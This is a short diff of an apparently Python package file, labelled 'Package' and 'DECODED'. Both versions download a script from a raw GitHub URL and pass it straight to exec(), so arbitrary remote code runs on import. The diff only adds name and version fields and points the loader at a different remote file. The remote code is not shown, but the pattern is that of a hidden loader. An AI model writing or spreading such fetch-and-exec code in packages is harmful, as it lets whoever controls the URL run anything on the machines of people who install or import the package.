@@ -1,5 +1,7 @@
 [""" Package """]
 import urllib.request
-exec(urllib.request.urlopen("https://raw.githubusercontent.com/Fries-byte/pistud/refs/heads/main/extra/ptd/src.py").read().decode())
+name = "versions"
+version = 10
+exec(urllib.request.urlopen("https://raw.githubusercontent.com/Fries-byte/pistud/refs/heads/main/packages.py").read().decode())
 
 [""" DECODED """]
